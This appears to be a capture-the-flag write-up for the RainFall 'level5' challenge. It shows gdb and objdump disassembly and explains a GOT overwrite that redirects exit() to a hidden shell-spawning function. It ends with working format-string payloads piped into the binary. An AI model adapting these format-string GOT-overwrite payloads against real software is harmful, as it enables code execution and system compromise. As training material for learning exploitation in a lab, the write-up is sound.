Disassembled version with gdb:

```assembly
Dump of assembler code for function main:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```

We only see these two functions if we follow the function call stack from main. However, an objdump reveals a function <o> calling bin/sh:

```assembly
080484a4 <o>:
 80484a4:	55                   	push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	83 ec 18             	sub    $0x18,%esp
 80484aa:	c7 04 24 f0 85 04 08 	movl   $0x80485f0,(%esp)
 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
 80484b6:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>
```

I will attempt to write the address of the function o() `080484a4` somewhere to make the program jump to /bin/sh. But we need to find where to place this address. It might be challenging to use EIP since n() does not return to main and instead uses exit().

The idea would be to achieve a **code execution redirection** by going through a trick called **GOT overwrite**, and thereby substitute the call to the exit() function with a call to the o() function.

Here is the article that helped me understand this technique: https://axcheron.github.io/exploit-101-format-strings/#code-execution-redirect

To find the address of exit() in the Global Offset Table:

```shell
level5@RainFall:~$ objdump -R ./level5 

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

Now all that's left is to rewrite the address of o(), which is `080484a4`, at the location of exit() in the Global Offset Table, which is `08049838`. The payload finally looks like this:

```shell
(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'; cat) | ./level5
```

In a 2-byte by 2-byte version:

```shell
(python -c 'print "\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%33948d%4$hn" + "%33632d%5$hn"'; cat) | ./level5
```

All that's left is to retrieve the flag!
